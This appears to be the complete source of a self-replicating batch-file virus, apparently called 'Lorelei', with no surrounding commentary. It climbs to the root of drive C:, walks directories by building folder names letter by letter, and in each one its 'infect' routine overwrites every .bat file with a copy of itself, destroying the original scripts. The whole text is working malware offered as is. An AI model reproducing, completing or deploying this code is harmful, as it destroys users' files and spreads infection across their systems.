<html>cls
@echo off
set saveA=Lorelei
set saveB=Lorelei
set saveC=Lorelei
set buffer=Loro
:Again
set counter=%counter%!
if %counter%==!!! exit
set count=Lorelei
set StageA=StageA
set StageB=StageB
set StageC=StageC
set exspth=exspth
:GetRoot
cd..
set GRcheck=%GRcheck%x
if %GRcheck%==xxxxxxxx goto GotRoot
goto GetRoot
:GotRoot
set GRcheck=
C:
set spth=C:\
set Oldspth=%spth%
set BackJmpLable=DirCheck
goto infect

:DirCheck
dir %spth%* >C:\Lorelei
find "<DIR>" C:\Lorelei>trash
set ThOfTr=a
if %spth%==%exspth% set ThOfTr=gothic
if NOT ERRORLEVEL 1 set BackJmpLable=SetDirCheck
if NOT ERRORLEVEL 1 set Oldspth=%spth%
if NOT ERRORLEVEL 1 goto AddNewLetter
set spth=%Oldspth%
goto DirCheck

:SetDirCheck
cd %spth%>trash
if NOT ERRORLEVEL 1 set BackJmpLable=SDCfinish
if NOT ERRORLEVEL 1 goto infect
goto DirCheck

:SDCfinish
if %spth%==%saveA% set ThOfTr=e
if %spth%==%saveB% set ThOfTr=e
if %spth%==%saveC% set ThOfTr=e
if %ThOfTr%==e set spth=%Oldspth%
if %ThOfTr%==e goto DirCheck
set SDCvar=SDCvar
if NOT %StageA%==Lorelei set SDCvar=1
if %SDCvar%==1 set StageA=Lorelei
if %SDCvar%==1 goto Savevar
if NOT %StageB%==Lorelei set SDCvar=2
if %SDCvar%==2 set StageB=Lorelei
if %SDCvar%==2 goto Savevar
if NOT %StageC%==Lorelei set SDCvar=3
if %SDCvar%==3 set StageC=Lorelei
if %SDCvar%==3 goto SaveVar
exit

:AddNewLetter
set ThOfTr=a
set AddNewLetterVar=%AddNewLetterVar%y
if %AddNewLetterVar%==y if %exspth%==%spth% if %count%==! goto Again
if %AddNewLetterVar%==y if %exspth%==%spth% set count=!
if %AddNewLetterVar%==y set exspth=%spth%
if %AddNewLetterVar%==y set spth=%spth%a
if %AddNewLetterVar%==yy set spth=%spth%b
if %AddNewLetterVar%==yyy set spth=%spth%c
if %AddNewLetterVar%==yyyy set spth=%spth%d
if %AddNewLetterVar%==yyyyy set spth=%spth%e
if %AddNewLetterVar%==yyyyyy set spth=%spth%f
if %AddNewLetterVar%==yyyyyyy set spth=%spth%g
if %AddNewLetterVar%==yyyyyyyy set spth=%spth%h
if %AddNewLetterVar%==yyyyyyyyy set spth=%spth%i
if %AddNewLetterVar%==yyyyyyyyyy set spth=%spth%j
if %AddNewLetterVar%==yyyyyyyyyyy set spth=%spth%k
if %AddNewLetterVar%==yyyyyyyyyyyy set spth=%spth%l
if %AddNewLetterVar%==yyyyyyyyyyyyy set spth=%spth%m
if %AddNewLetterVar%==yyyyyyyyyyyyyy set spth=%spth%n
if %AddNewLetterVar%==yyyyyyyyyyyyyyy set spth=%spth%o
if %AddNewLetterVar%==yyyyyyyyyyyyyyyy set spth=%spth%p
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyy set spth=%spth%q
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyy set spth=%spth%r
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyy set spth=%spth%s
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyy set spth=%spth%t
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyy set spth=%spth%u
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyy set spth=%spth%v
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyy set spth=%spth%w
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyyy set spth=%spth%x
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyyyy set spth=%spth%y
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyyyyy set spth=%spth%z
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyyyyy set AddNewLetterVar=
goto %BackJmpLable%

:SaveVar
set spth=%spth%\
goto DirCheck

:infect
for %%a in (*.bat) do copy %0 %%a
goto %BackJmpLable%